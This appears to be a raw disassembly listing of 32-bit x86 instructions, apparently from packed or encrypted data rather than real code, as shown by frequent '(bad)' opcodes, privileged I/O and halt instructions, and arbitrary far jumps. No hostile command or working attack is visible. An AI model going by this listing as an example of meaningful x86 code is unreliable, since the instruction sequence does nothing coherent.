  405b33:	cmp    bh,BYTE PTR [ecx+0x37895536]
  405b39:	push   edi
  405b3a:	iret   
  405b3b:	mov    dh,0x4e
  405b3d:	inc    ebx
  405b3e:	dec    edi
  405b3f:	or     cl,BYTE PTR [ebp+0x5b487ee8]
  405b45:	cmp    eax,0xe57db7c
  405b4a:	mov    eax,0x435ae5c1
  405b4f:	rcr    dh,1
  405b51:	or     BYTE PTR [eax],bh
  405b53:	mov    bh,0x2
  405b55:	push   0xdb944dfe
  405b5a:	scas   al,BYTE PTR es:[edi]
  405b5b:	jne    0x405b60
  405b5d:	adc    ecx,DWORD PTR [ecx+0x4f51f740]
  405b63:	add    ecx,DWORD PTR [edx+0x7b]
  405b66:	push   ds
  405b67:	add    BYTE PTR [ecx+0x73],al
  405b6a:	lahf   
  405b6b:	neg    BYTE PTR [edx-0x12]
  405b6e:	popf   
  405b6f:	inc    ebx
  405b70:	enter  0x7ce9,0x97
  405b74:	xchg   ecx,eax
  405b75:	or     al,0xf0
  405b77:	jnp    0x405b44
  405b79:	xor    bl,al
  405b7b:	cmc    
  405b7c:	add    dl,BYTE PTR [edi+0x3fe2f9]
  405b82:	inc    edx
  405b83:	pop    ebx
  405b84:	les    edx,FWORD PTR [edx+0x38f0b976]
  405b8a:	out    dx,eax
  405b8b:	dec    edi
  405b8c:	pop    ds
  405b8d:	loop   0x405c03
  405b8f:	add    DWORD PTR [eax-0x782ea15c],ecx
  405b95:	xchg   ebx,eax
  405b96:	sahf   
  405b97:	mov    WORD PTR ds:0x84cf51d5,?
  405b9d:	popf   
  405b9e:	dec    edi
  405b9f:	(bad)  
  405ba1:	out    0x8c,al
  405ba3:	add    BYTE PTR [esi+0x6a60c1bc],al
  405ba9:	sub    eax,0x4a91f337
  405bae:	cdq    
  405baf:	cli    
  405bb0:	stos   BYTE PTR es:[edi],al
  405bb1:	jmp    0xc9395a4
  405bb6:	aam    0x39
  405bb8:	out    0x2c,eax
  405bba:	stos   BYTE PTR es:[edi],al
  405bbb:	pop    esp
  405bbc:	jmp    0xf7e4:0x89d3ae49
  405bc3:	dec    eax
  405bc4:	in     al,0x2f
  405bc6:	jbe    0x405b62
  405bc8:	sub    DWORD PTR [ecx-0x438e475a],esp
  405bce:	hlt    
  405bcf:	jge    0x405bca
  405bd1:	mov    bl,0xaf
  405bd3:	pop    DWORD PTR [ebp+0x4bd9cafe]
  405bd9:	push   esi
  405bda:	leave  
  405bdb:	cmp    al,0x31
  405bdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bde:	daa    
  405bdf:	and    DWORD PTR [edi-0x36e60408],0xe7ce5ae0
  405be9:	lahf   
  405bea:	add    edx,ebx
  405bec:	jo     0x405bf8
  405bee:	xor    BYTE PTR [ebx+0x7a95b2ff],ah
  405bf4:	mov    edi,0x45628a50
  405bf9:	in     al,dx
  405bfa:	sub    DWORD PTR [ecx-0x3],0xe7b79251
  405c01:	fcomp  QWORD PTR [eax-0x4a]
  405c04:	hlt    
  405c05:	lock add eax,0x5b07ebd5
  405c0b:	(bad)  
  405c0d:	push   0xffffff84
  405c0f:	push   es
  405c10:	aas    
  405c11:	lahf   
  405c12:	cmp    ah,BYTE PTR ds:0xeefe2639
  405c18:	out    0x4e,eax
  405c1a:	faddp  st(4),st
  405c1c:	call   0xc297:0xb4b72ab4
  405c23:	jmp    0x77a672c6
  405c28:	mov    al,ds:0xdd758316
  405c2d:	jg     0x405bc5
  405c2f:	xor    eax,0xa6a7237e
  405c34:	inc    edx
  405c35:	fbstp  TBYTE PTR [ebx-0x72]
  405c38:	outs   dx,DWORD PTR ds:[esi]
  405c39:	mov    bh,0x4d
  405c3b:	mov    ebp,0x94a735ce
  405c40:	ja     0x405cb3
  405c42:	addr16 mul bl
  405c45:	jg     0x405c0d
  405c47:	call   0xede22d7f
  405c4c:	dec    ebp
  405c4d:	push   cs
  405c4e:	cmp    al,0xa8
  405c50:	sbb    edi,DWORD PTR [ecx-0x64aa466c]
  405c56:	inc    ebx
  405c57:	mov    ebx,ebx
  405c59:	add    ah,bh
  405c5b:	imul   ebx,DWORD PTR [eax-0x42],0x8e473221
  405c62:	mov    ah,0xb9
  405c64:	imul   edi,DWORD PTR [eax],0x1a72c312
  405c6a:	call   0xf057:0x2f365eb
  405c71:	jg     0x405cd4
  405c73:	pop    ebx
  405c74:	shr    DWORD PTR [edx+0x15d0d622],0x3d
  405c7b:	sbb    DWORD PTR [esi+ebp*4],ebp
  405c7e:	xor    ebx,0x50
  405c81:	aas    
  405c82:	sbb    eax,0x2eef0857
  405c87:	sahf   
  405c88:	jle    0x405c6d
  405c8a:	push   ds
  405c8b:	or     eax,0x1abc7981
  405c90:	addr16 dec edi
  405c92:	jns    0x405c55
  405c94:	mov    edi,0x2ea67773
  405c99:	add    dh,ch
  405c9b:	les    ebx,FWORD PTR [edx]
  405c9d:	or     al,0xd4
  405c9f:	xchg   DWORD PTR [eax+0x2b],edx
  405ca2:	mov    al,ds:0x8cf5a593
  405ca7:	jne    0x405cd8
  405ca9:	and    eax,0x7237369
  405cae:	les    ebx,FWORD PTR [ebp+ebp*1-0x5f]
  405cb2:	shl    BYTE PTR [edx+0x24],1
  405cb5:	cmc    
  405cb6:	lds    edx,FWORD PTR [eax-0x5fe692ba]
  405cbc:	jae    0x405cbb
  405cbe:	adc    DWORD PTR [eax+0x24],edx
  405cc1:	jge    0x405cad
  405cc3:	es add edx,ecx
  405cc6:	dec    esp
  405cc7:	fisubr WORD PTR [edx+0x59]
  405cca:	hlt    
  405ccb:	test   DWORD PTR [edi+ecx*4+0x198ad78c],0xef421f3a
  405cd6:	loope  0x405c68
  405cd8:	mov    bl,0x6c
  405cda:	mov    ch,0x30
  405cdc:	(bad)  
  405cdd:	cdq    
  405cde:	sub    ebp,DWORD PTR [esi-0x5a]
  405ce1:	fwait
  405ce2:	jne    0x405cdb
  405ce4:	imul   ecx,DWORD PTR [ebx+0x25],0xffffff83
  405ce8:	jns    0x405cc3
  405cea:	in     eax,dx
  405ceb:	lds    ebp,FWORD PTR ds:0xe0562f2b
  405cf1:	add    DWORD PTR [eax-0x5b],0x9a9e9a02
  405cf8:	test   al,0x43
  405cfa:	dec    esi
  405cfb:	js     0x405d00
  405cfd:	dec    edx
  405cfe:	inc    eax
  405cff:	sbb    eax,0x430c0a37
  405d04:	jl     0x405c8d
  405d06:	push   0xa3cb58c9
  405d0b:	sub    cl,BYTE PTR ds:[esp+esi*8]
  405d0f:	jo     0x405d7d
  405d11:	ret    
  405d12:	jns    0x405c98
  405d14:	mov    dh,0x5c
  405d16:	out    dx,eax
  405d17:	mov    dl,dh
  405d19:	int3   
  405d1a:	and    BYTE PTR [ebx+0x6f],dh
  405d1d:	repnz les ebp,FWORD PTR [esi]
  405d20:	push   ecx
  405d21:	jns    0x405cd8
  405d23:	sub    al,0xa0
  405d25:	js     0x405d9d
  405d27:	aaa    
  405d28:	rcl    DWORD PTR ds:0x95972b5f,0x23
  405d2f:	sbb    cl,BYTE PTR [eax+0x70]
  405d32:	imul   ecx,DWORD PTR [ebp-0xde22c42],0x14d0b638
  405d3c:	jle    0x405d00
  405d3e:	xor    al,0x6f
  405d40:	ins    DWORD PTR es:[edi],dx
  405d41:	or     BYTE PTR [ebx-0x49bf6a8d],ah
  405d47:	mov    edx,0x98782815
  405d4c:	mov    ah,0xdc
  405d4e:	push   0x39
  405d50:	pop    edi
  405d51:	das    
  405d52:	pushf  
  405d53:	cmc    
  405d54:	mov    ah,0x21
  405d56:	pop    es
  405d57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d58:	pop    edi
  405d59:	cmp    al,0x6f
  405d5b:	call   0x7d6c63da
  405d60:	imul   eax,DWORD PTR [edi+edx*4],0xffffff8c
  405d64:	(bad)  
  405d65:	rol    BYTE PTR [ebx*1-0x19ca2e59],1
  405d6c:	mov    ecx,0x7d5d7c65
  405d71:	sbb    eax,0x12f040ff
  405d76:	in     eax,0x51
  405d78:	sti    
  405d79:	pop    edi
  405d7a:	js     0x405da6
  405d7c:	sti    
  405d7d:	hlt    
  405d7e:	es ins BYTE PTR es:[edi],dx
  405d80:	jecxz  0x405db4
  405d82:	test   edx,ebx
  405d84:	jbe    0x405d0a
  405d86:	push   0xffffffbb
  405d88:	in     eax,0xa9
  405d8a:	inc    edx
  405d8b:	xchg   ebx,eax
  405d8c:	in     al,0x22
  405d8e:	das    
  405d8f:	arpl   WORD PTR [eax],ax
  405d91:	add    ebp,DWORD PTR [ecx+eiz*1]
  405d94:	or     BYTE PTR [bx+di+0x1f],ah
  405d98:	jge    0x405d22
  405d9a:	test   dl,cl
  405d9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d9d:	mov    eax,ds:0xa363e8c8
  405da2:	test   BYTE PTR [esi-0x7e777cdf],al
  405da8:	cmc    
  405da9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405daa:	call   0x7876ef9f
  405daf:	xor    ecx,DWORD PTR ds:0x45208e3f
  405db5:	add    al,0xbd
  405db7:	mov    ecx,0xc0b61eee
  405dbc:	fisubr WORD PTR [ecx+0x6a]
  405dbf:	pop    ss
  405dc0:	out    0xdf,al
  405dc2:	cmp    eax,0x2483b805
  405dc7:	inc    ecx
  405dc8:	dec    ecx
  405dc9:	cmp    ah,al
  405dcb:	xchg   esi,eax
  405dcc:	shr    DWORD PTR [edx+0x187eb07c],0xb9
  405dd3:	in     eax,dx
  405dd4:	cs push eax
  405dd6:	cmp    ebx,DWORD PTR [edx]
  405dd8:	sahf   
  405dd9:	pop    esp
  405dda:	dec    ecx
  405ddb:	jnp    0x405d9f
  405ddd:	pop    esi
  405dde:	push   eax
  405ddf:	sub    al,0x10
  405de1:	lock lods eax,DWORD PTR ds:[esi]
  405de3:	fwait
  405de4:	loope  0x405dd4
  405de6:	inc    ebx
  405de7:	rcr    ecx,1
  405de9:	in     eax,0xc8
  405deb:	in     eax,dx
  405dec:	add    eax,esp
  405dee:	clc    
  405def:	aas    
  405df0:	fsub   st,st(2)
  405df2:	sub    al,0x63
  405df4:	or     edi,ecx
  405df6:	out    0x44,al
  405df8:	imul   edi,DWORD PTR [ecx],0xffffffa1
  405dfb:	scas   al,BYTE PTR es:[edi]
  405dfc:	scas   al,BYTE PTR es:[edi]
  405dfd:	fwait
  405dfe:	push   esp
  405dff:	in     eax,0xc3
  405e01:	xchg   DWORD PTR [eax],ebp
  405e03:	retf   
  405e04:	dec    esp
  405e05:	mov    bh,BYTE PTR [ecx+0x3b]
  405e08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e09:	dec    ebx
  405e0a:	fimul  WORD PTR ds:0x3629dc33
  405e10:	push   es
  405e11:	mov    ch,0x29
  405e13:	imul   ebp,DWORD PTR [edi+0x27de2c90],0xffffff89
  405e1a:	cmp    esp,DWORD PTR [eax-0x145d8b4e]
  405e20:	sbb    BYTE PTR [eax+0x7f],bl
  405e23:	dec    edi
  405e24:	push   ecx
  405e25:	xchg   BYTE PTR [ebx-0xb],ah
  405e28:	int    0xb4
  405e2a:	pop    eax
  405e2b:	sub    al,0x98
  405e2d:	outs   dx,DWORD PTR ds:[esi]
  405e2e:	xchg   esi,ecx
  405e30:	mov    bh,0x8a
  405e32:	xchg   DWORD PTR [ebp+0x7b08fc7d],ecx
  405e38:	push   ebp
  405e39:	jecxz  0x405e01
  405e3b:	jecxz  0x405e3e
  405e3d:	mov    ds:0x10139476,eax
  405e42:	xlat   BYTE PTR ds:[ebx]
  405e43:	adc    ebp,DWORD PTR [ecx+0x23]
  405e46:	xor    eax,0x9398adf5
  405e4b:	lahf   
  405e4c:	fmul   QWORD PTR [ebx-0x6e]
  405e4f:	mov    al,ds:0xc1700edf
  405e54:	xchg   ebp,eax
  405e55:	mov    esi,0xcce8a9e9
  405e5a:	loopne 0x405ebc
  405e5c:	pusha  
  405e5d:	in     al,dx
  405e5e:	cmp    esp,DWORD PTR ds:0x44987b53
  405e64:	in     al,0x6
  405e66:	add    BYTE PTR [edi+0x1fc960da],bh
  405e6c:	mov    dh,0x29
  405e6e:	in     eax,0x35
  405e70:	xchg   eax,edi
  405e72:	fidiv  WORD PTR [eax-0x23]
  405e75:	xchg   ebx,eax
  405e76:	out    dx,eax
  405e77:	xchg   ecx,eax
  405e78:	loop   0x405e4a
  405e7a:	(bad)  
  405e7b:	fstp   st(1)
  405e7d:	lds    edx,FWORD PTR [esi]
  405e7f:	add    bh,bl
  405e81:	cmp    BYTE PTR [ebx+0x3],al
  405e84:	sub    dl,ch
  405e86:	xchg   esi,eax
  405e87:	ins    BYTE PTR es:[edi],dx
  405e88:	mov    esi,cs
  405e8a:	cmp    al,0x53
  405e8c:	inc    ecx
  405e8d:	push   ecx
  405e8e:	aam    0xca
  405e90:	dec    esp
  405e91:	xchg   DWORD PTR [esi+0x71f99c97],ebp
  405e97:	adc    ebx,DWORD PTR [ecx+0x3c]
  405e9a:	fs pushf 
  405e9c:	mov    DWORD PTR [esi+0x2],eax
  405e9f:	in     eax,dx
  405ea0:	fwait
  405ea1:	popf   
  405ea2:	sbb    al,0x11
  405ea4:	scas   eax,DWORD PTR es:[edi]
  405ea5:	leave  
  405ea6:	mov    ch,0x20
  405ea8:	push   cs
  405ea9:	and    DWORD PTR [ebx],ebp
  405eab:	jp     0x405ec6
  405ead:	or     bl,cl
  405eaf:	inc    ecx
  405eb0:	sbb    DWORD PTR ds:0x83d2dcfc,esi
  405eb6:	mov    bl,0x1
  405eb8:	shl    BYTE PTR es:[ebp+0x39],1
  405ebc:	(bad)  
  405ebd:	loop   0x405e6c
  405ebf:	push   ss
  405ec0:	jae    0x405eaa
  405ec2:	paddb  mm3,mm1
  405ec5:	jp     0x405e62
  405ec7:	jnp    0x405e51
  405ec9:	jmp    0x405f40
  405ecb:	sub    ebp,DWORD PTR [edi]
  405ecd:	fistp  QWORD PTR [ebx]
  405ecf:	repnz (bad) 
  405ed1:	jecxz  0x405e68
  405ed3:	lds    ecx,FWORD PTR [edx]
  405ed5:	push   0x29
  405ed7:	aad    0xe4
  405ed9:	hlt    
  405eda:	mov    al,ah
  405edc:	or     eax,0x1fde28
  405ee1:	fs inc esi
  405ee3:	xchg   ebx,eax
  405ee4:	cmp    ebx,edx
  405ee6:	fst    DWORD PTR [edx]
  405ee8:	mov    edx,DWORD PTR [edx-0x66d715d4]
  405eee:	push   esp
  405eef:	stos   BYTE PTR es:[edi],al
  405ef0:	push   ss
  405ef1:	les    esp,FWORD PTR [ebx]
  405ef3:	popa   
  405ef4:	push   ebp
  405ef5:	cmp    ecx,DWORD PTR [ebp+edx*1+0x32]
  405ef9:	pop    eax
  405efa:	push   edx
  405efb:	pop    esp
  405efc:	cwde   
  405efd:	dec    eax
  405efe:	cld    
  405eff:	sub    DWORD PTR [edi-0x79],esi
  405f02:	retf   0xbd32
  405f05:	pop    esi
  405f06:	js     0x405eca
  405f08:	arpl   di,bx
  405f0a:	(bad)
  405f0d:	fild   QWORD PTR [ebp+0x68]
  405f10:	sub    esi,ebx
  405f12:	aad    0xb5
  405f14:	mov    ds,WORD PTR [ecx-0x7f0124e3]
  405f1a:	jb     0x405f50
  405f1c:	pop    edi
  405f1d:	fiadd  WORD PTR [ebx+0x25f2c258]
  405f23:	mov    esp,0x3a8a2d4e
  405f28:	(bad)  
  405f29:	fnstenv [ecx+0x4a]
  405f2c:	shr    dh,1
  405f2e:	pushf  
  405f2f:	cdq    
  405f30:	sub    DWORD PTR [ebx+0x57ec45e2],esi
  405f36:	fstp   TBYTE PTR [eax-0x6]
  405f39:	fld    QWORD PTR [esi+eax*2-0x5ea41091]
  405f40:	hlt    
  405f41:	outs   dx,DWORD PTR ds:[esi]
  405f42:	adc    al,0xa4
  405f44:	lds    eax,FWORD PTR [edi]
  405f46:	xor    BYTE PTR [edx+0x5be625f3],bl
  405f4c:	pop    ds
  405f4d:	adc    bh,ah
  405f4f:	lods   al,BYTE PTR ds:[esi]
  405f50:	pop    eax
  405f51:	or     BYTE PTR [edi-0x7e],ch
  405f54:	mov    eax,0x92e7443d
  405f59:	mov    ds,WORD PTR [ebx+0x4590b972]
  405f5f:	jmp    0x8a19:0xe9693b62
  405f66:	test   DWORD PTR [edi-0x50],eax
  405f69:	scas   eax,DWORD PTR es:[edi]
  405f6a:	push   edx
  405f6b:	aaa    
  405f6c:	ds push ds
  405f6e:	enter  0xfae1,0x60
  405f72:	pusha  
  405f73:	js     0x405f8c
  405f75:	fs jbe 0x405ff2
  405f78:	fwait
  405f79:	jbe    0x405f46
  405f7b:	mov    bh,0xb8
  405f7d:	call   0xf062:0x7d1c0f65
  405f84:	nop
  405f85:	int    0x22
  405f87:	mov    eax,ds:0x74475762
  405f8c:	sahf   
  405f8d:	loop   0x405f4c
  405f8f:	sar    BYTE PTR [ecx+0x46d4a258],0x55
  405f96:	ret    0x91e0
  405f99:	lahf   
  405f9a:	das    
  405f9b:	sbb    DWORD PTR [ebx+0x36],esp
  405f9e:	int3   
  405f9f:	popa   
  405fa0:	xor    cl,ah
  405fa2:	push   eax
  405fa3:	das    
  405fa4:	imul   ebp,esi,0xfffffffd
  405fa7:	xchg   ebx,eax
  405fa8:	mov    esp,0x23a01a0f
  405fad:	fsubr  DWORD PTR [ecx]
  405faf:	mov    ch,0x78
  405fb1:	aam    0x5f
  405fb3:	xchg   ecx,eax
  405fb4:	loop   0x405f7f
  405fb6:	ins    DWORD PTR es:[edi],dx
  405fb7:	cmp    BYTE PTR [edi+ebp*8],ah
  405fba:	int    0xff
  405fbc:	and    edi,edi
  405fbe:	mov    ah,0xb3
  405fc0:	popa   
  405fc1:	bound  eax,QWORD PTR [ebx+0x1357c821]
  405fc7:	fbld   TBYTE PTR [ecx+0x3f]
  405fca:	into   
  405fcb:	aas    
  405fcc:	or     al,0x98
  405fce:	or     ebp,DWORD PTR [eax*8-0x8e40327]
  405fd5:	loope  0x405fce
  405fd7:	int3   
  405fd8:	shl    DWORD PTR [edi-0x3e],cl
  405fdb:	pushf  
  405fdc:	lods   eax,DWORD PTR es:[esi]
  405fde:	and    DWORD PTR [edi],esi
  405fe0:	jne    0x405fea
  405fe2:	inc    edx
  405fe3:	mov    eax,ds:0x334fd9b4
  405fe8:	ins    BYTE PTR es:[edi],dx
  405fe9:	jbe    0x40603e
  405feb:	jg     0x405f9c
  405fed:	sbb    BYTE PTR [esp+esi*4+0x2f],dh
  405ff1:	cmp    edi,DWORD PTR [edi+edx*4-0x3ee7ee3e]
  405ff8:	jno    0x405fd6
  405ffa:	xlat   BYTE PTR ds:[ebx]
  405ffb:	dec    ebp
  405ffc:	les    ecx,FWORD PTR [edx+0x6d602cae]
  406002:	neg    eax
  406004:	popa   
  406005:	mov    ecx,0xdc1ff85d
  40600a:	mov    gs,WORD PTR [ebp-0x6d5dfa3a]
  406010:	faddp  st(7),st
  406012:	ja     0x405fb1
  406014:	or     BYTE PTR [edi-0x572273a2],bl
  40601a:	xlat   BYTE PTR ds:[ebx]
  40601b:	das    
  40601c:	das    
  40601d:	std    
  40601e:	jnp    0x405fac
  406020:	and    eax,0xb4714f0a
  406025:	iret   
  406026:	fwait
  406027:	sti    
  406028:	xchg   ebx,eax
  406029:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40602a:	adc    eax,0x65399712
  40602f:	in     al,dx
  406030:	pop    ss
  406031:	and    eax,0xb205a331
  406036:	mov    dh,0x0
  406038:	enter  0xb62b,0x1a
  40603c:	hlt    
  40603d:	scas   eax,DWORD PTR es:[edi]
  40603e:	mov    esp,0x20836427
  406043:	xor    esi,0xffffffa2
  406046:	neg    BYTE PTR [edi-0x5d925937]
  40604c:	shl    DWORD PTR [ebx],1
  40604e:	in     al,dx
  40604f:	popf   
  406050:	cmp    ch,ch
  406052:	dec    eax
  406053:	or     ebx,DWORD PTR [edi]
  406055:	cmp    bh,BYTE PTR [ecx+ebp*2]
  406058:	fbld   TBYTE PTR [ebx-0x20de7a96]
  40605e:	(bad)  
  40605f:	(bad)  [edi+0x28e33fe4]
  406065:	dec    ebp
  406066:	xchg   esp,eax
  406067:	mov    ds:0x328ae868,eax
  40606c:	inc    ecx
  40606d:	inc    eax
  40606e:	popf   
  40606f:	(bad)  
  406070:	sub    edi,DWORD PTR [ebx-0x6b]
  406073:	push   ss
  406074:	xor    BYTE PTR [ebx],0x95
  406077:	xchg   esi,eax
  406078:	xchg   ebx,eax
  406079:	icebp  
  40607a:	hlt    
  40607b:	pop    eax
  40607c:	add    eax,0x1aa5e4d1
  406081:	lods   al,BYTE PTR ds:[esi]
  406082:	jge    0x40604c
  406084:	repnz push eax
  406086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406087:	xor    eax,0xf7fe1e
  40608c:	and    al,0x25
  40608e:	push   ss
  40608f:	add    edx,DWORD PTR [ebx]
  406091:	fistp  WORD PTR [esp+eax*4]
  406094:	xchg   edi,eax
  406095:	out    dx,al
  406096:	jl     0x2745ddae
  40609c:	or     eax,DWORD PTR [esi]
  40609e:	shr    DWORD PTR [edx],1
  4060a0:	psubusw mm1,QWORD PTR [esi]
  4060a3:	jae    0x40607d
  4060a5:	fwait
  4060a6:	inc    edi
  4060a7:	add    edi,DWORD PTR [edi+0x5]
  4060aa:	jg     0x4060e8
  4060ac:	push   es
  4060ad:	sub    al,0xb8
  4060af:	dec    ebx
  4060b0:	mov    cl,BYTE PTR [esi-0x5c]
  4060b3:	cmp    esi,DWORD PTR [ebp+0x75]
  4060b6:	cs mov ch,0xa2
  4060b9:	push   ebx
  4060ba:	jo     0x4060b8
  4060bc:	test   BYTE PTR [edi+edi*4+0xb],cl
  4060c0:	mov    BYTE PTR [edi-0x75],cl
  4060c3:	pop    ebx
  4060c4:	xchg   edx,eax
  4060c5:	lods   al,BYTE PTR ds:[esi]
  4060c6:	dec    eax
  4060c7:	and    eax,0xc343f005
  4060cc:	push   ebp
  4060cd:	dec    ecx
  4060ce:	out    0x2b,al
  4060d0:	mov    eax,ds:0xae940aaa
  4060d5:	and    eax,0xeae0cbf5
  4060da:	mov    cl,0x85
  4060dc:	cmp    ecx,DWORD PTR [ebx-0x78]
  4060df:	call   0x42893fb1
  4060e4:	and    DWORD PTR [ebx],0x84f4d48a
  4060ea:	and    ch,BYTE PTR [edi+0x50d89fb]
  4060f0:	cmc    
  4060f1:	ins    DWORD PTR es:[edi],dx
  4060f2:	xchg   esi,eax
  4060f3:	adc    cl,BYTE PTR [ecx-0x3c]
  4060f6:	int    0x59
  4060f8:	pop    ds
  4060f9:	jle    0x4060d5
  4060fb:	out    dx,al
  4060fc:	dec    bh
  4060fe:	adc    eax,0xf2f218c4
  406103:	inc    esi
  406104:	xchg   esp,eax
  406105:	mov    edi,0x3128f2ee
  40610a:	xor    al,0x8b
  40610c:	jnp    0x406115
  40610e:	xor    DWORD PTR [eax-0x239847bc],edx
  406114:	mov    dl,0x6c
  406116:	in     al,dx
  406117:	ins    BYTE PTR es:[edi],dx
  406118:	repz cmp BYTE PTR [edx+edx*4-0x162077ea],bl
  406120:	out    dx,eax
  406121:	push   edi
  406122:	mov    al,ds:0x1e2e6dbf
  406127:	fisttp DWORD PTR [edx+0x46]
  40612a:	out    dx,al
  40612b:	je     0x406144
  40612d:	call   0xa4d409
  406132:	push   0x71
  406134:	sti    
  406135:	gs (bad) 
  406137:	scas   eax,DWORD PTR es:[edi]
  406138:	xchg   ebx,eax
  406139:	xchg   ebx,eax
  40613a:	xchg   DWORD PTR [esi-0x4],ecx
  40613d:	push   edx
  40613e:	aam    0x55
  406140:	pop    edi
  406141:	hlt    
  406142:	popa   
  406143:	xor    al,0xf6
  406145:	adc    ch,al
  406147:	mov    dh,0x6b
  406149:	xor    eax,0xee7df95
  40614e:	shr    bl,0x78
  406151:	mov    dh,0x9f
  406153:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406154:	pop    edi
  406155:	mov    ds:0x118a29e4,eax
  40615a:	add    al,0xfc
  40615c:	push   ecx
  40615d:	les    esi,FWORD PTR [eax+0x784da8f2]
  406163:	cmp    ah,BYTE PTR [ebp-0x7589b445]
  406169:	dec    esi
  40616a:	not    DWORD PTR [esi+ecx*4+0x12]
  40616e:	pop    edi
  40616f:	stc    
  406170:	adc    BYTE PTR [ecx+0x4f480206],dl
  406176:	xor    DWORD PTR [edx+0x2f],esi
  406179:	enter  0x8124,0xeb
  40617d:	retf   
  40617e:	repz int 0x3f
  406181:	jmp    0x54fd0333
  406186:	mov    bl,0x12
  406188:	xchg   esi,eax
  406189:	jno    0x4061ee
  40618b:	sub    ebx,0x27
  40618e:	dec    DWORD PTR [edx+edi*4+0x6a]
  406192:	scas   al,BYTE PTR es:[edi]
  406193:	cdq    
  406194:	or     esp,DWORD PTR [ebx-0x53]
  406197:	inc    eax
  406198:	push   es
  406199:	rol    ebp,0xb0
  40619c:	dec    esi
  40619d:	int    0xef
  40619f:	sub    ecx,DWORD PTR [ebx]
  4061a1:	enter  0x5053,0x57
  4061a5:	ins    BYTE PTR es:[edi],dx
  4061a6:	jl     0x40613f
  4061a8:	sub    al,0x13
  4061aa:	add    ebx,esp
  4061ac:	sar    DWORD PTR [ebx+0x32],0x4b
  4061b0:	inc    ebp
  4061b1:	clc    
  4061b2:	add    BYTE PTR [edi],cl
  4061b4:	daa    
  4061b5:	shl    BYTE PTR [ecx-0x42],1
  4061b8:	ins    DWORD PTR es:[edi],dx
  4061b9:	adc    DWORD PTR [edi+0x34188907],edi
  4061bf:	lods   al,BYTE PTR ds:[esi]
  4061c0:	fidivr WORD PTR [ebx-0xc]
  4061c3:	jmp    0x406197
  4061c5:	cli    
  4061c6:	add    al,0xee
  4061c8:	retf   
  4061c9:	ja     0x4061f8
  4061cb:	mov    ch,al
  4061cd:	xrelease mov DWORD PTR [ebx-0x4],0xb35645ff
  4061d5:	adc    DWORD PTR [ebp-0x1],edx
  4061d8:	arpl   WORD PTR [eax-0x1c0b67e5],bx
  4061de:	aad    0x7c
  4061e0:	xor    bl,BYTE PTR [esi+0x52237b0c]
  4061e6:	jle    0x40624b
  4061e8:	cmp    eax,0x8364f85
  4061ed:	imul   ebx,DWORD PTR [ebp+eiz*8-0x7627c9e6],0xee853ceb
  4061f8:	jmp    0x6652:0x7c37fde0
  4061ff:	xchg   edx,eax
  406200:	xchg   edi,eax
  406201:	and    eax,0xd8476410
  406206:	mov    bh,0x61
  406208:	sbb    BYTE PTR [eax],dl
  40620a:	pop    es
  40620b:	fsub   st,st(5)
  40620d:	sbb    BYTE PTR [edx+0x3bd28d08],cl
  406213:	adc    edx,DWORD PTR [edx]
  406215:	rep ins BYTE PTR es:[edi],dx
  406217:	loopne 0x406249
  406219:	inc    esp
  40621a:	mov    dh,0x2d
  40621c:	sbb    dh,BYTE PTR [esi+0x670422bb]
  406222:	and    cl,bh
  406224:	sar    DWORD PTR [ecx+0x5d],1
  406227:	ret    
  406228:	mov    ebp,esp
  40622a:	xor    DWORD PTR [ebx-0x5810e264],0x5
  406231:	cmp    esi,DWORD PTR [edi]
  406233:	ja     0x4062a6
  406235:	push   eax
  406236:	sub    al,BYTE PTR [ecx]
  406238:	mov    esp,0x8282448e
  40623d:	nop
  40623e:	stos   BYTE PTR es:[edi],al
  40623f:	mov    dl,bl
  406241:	ret    0x2721
  406244:	xor    bh,BYTE PTR [esi-0x79ec840a]
  40624a:	xchg   esi,eax
  40624b:	or     eax,0x7df75a65
  406250:	adc    al,0x21
  406252:	sbb    al,0x23
  406254:	ret    0x3aca
  406257:	and    dl,ch
  406259:	dec    eax
  40625a:	cdq    
  40625b:	cld    
  40625c:	sahf   
  40625d:	daa    
  40625e:	and    bl,BYTE PTR [ebp-0x4e]
  406261:	mov    bh,0xf8
  406263:	cdq    
  406264:	cmp    al,0x4c
  406266:	pop    ds
  406267:	pop    esi
  406268:	sahf   
  406269:	fnsave [ebx-0x674fb989]
  40626f:	sub    edx,DWORD PTR [ebx]
  406271:	push   0xa7e1dc66
  406276:	js     0x40623d
  406278:	test   al,0x24
  40627a:	repz xchg edx,eax
  40627c:	jmp    0x99b224c
  406281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406282:	iret   
  406283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406284:	jo     0x40621c
  406286:	stos   DWORD PTR es:[edi],eax
  406287:	jno    0x406273
  406289:	fs push ebx
  40628b:	cli    
  40628c:	push   edi
  40628d:	stos   DWORD PTR es:[edi],eax
  40628e:	enter  0x87b7,0xbf
  406292:	sbb    BYTE PTR [ebx],ch
  406294:	mov    BYTE PTR [eax],dh
  406296:	push   0x2ad94a0e
  40629b:	fwait
  40629c:	inc    eax
  40629d:	loopne 0x4062e2
  40629f:	in     al,0xf1
  4062a1:	call   0x412bdc86
  4062a6:	je     0x40630d
  4062a8:	push   ecx
  4062a9:	cmp    eax,0x682ecb59
  4062ae:	jb     0x406266
  4062b0:	(bad)  
  4062b1:	aad    0xaf
  4062b3:	jbe    0x406262
  4062b5:	pop    edi
  4062b6:	inc    esp
  4062b7:	out    dx,eax
  4062b8:	cdq    
  4062b9:	xor    edi,DWORD PTR [edi+0x68]
  4062bc:	jne    0x406247
  4062be:	jmp    0xe5a0ffc9
  4062c3:	jl     0x406328
  4062c5:	pop    ds
  4062c6:	push   ebp
  4062c7:	jnp    0x40630e
  4062c9:	fistp  DWORD PTR [edi]
  4062cb:	cli    
  4062cc:	fwait
  4062cd:	adc    eax,0x8125b389
  4062d2:	ror    DWORD PTR [ebx-0x5b],cl
  4062d5:	dec    eax
  4062d6:	adc    eax,0xe33c846f
  4062db:	and    al,0xfe
  4062dd:	into   
  4062de:	lods   al,BYTE PTR ds:[esi]
  4062df:	aas    
